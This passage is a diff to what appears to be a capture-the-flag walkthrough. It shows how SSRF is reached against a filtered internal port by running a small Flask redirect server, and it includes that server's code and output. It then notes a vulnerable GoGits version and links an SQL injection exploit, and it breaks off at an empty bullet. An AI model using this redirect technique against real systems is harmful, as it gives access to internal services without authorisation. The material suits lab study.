@@ -144,3 +144,45 @@ ID           Response   Lines    Word       Chars       Payload
 - I'll try to host `Monitored URL` via `python` and listen to `Payload URL` on `nc`
 
 ![](./images/4.png)
+
+- If try entering `localhost`, it returns error
+  - The reason was to check if I could perform `SSRF` on port `3000` which is filtered
+  - We can launch some `flask` app which will try to redirect to port `3000` and see if it works
+```
+from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def r():
+    url = request.args.get("url")
+    return redirect(url, code=302)
+
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=80)
+```
+```
+└─$ python3 app.py                                                                                                                
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.0.2.15:80
+<SNIP>
+```
+
+- We succesfully performed `SSRF`
+
+![](./images/5.png)
+
+- Let's test it on port `3000`
+
+![](./images/6.png)
+
+- It's a `GoGits Version: 0.5.5.1010 Beta`
+  - There is `sqli` in that specific version
+    - https://www.exploit-db.com/exploits/35238
+  - 
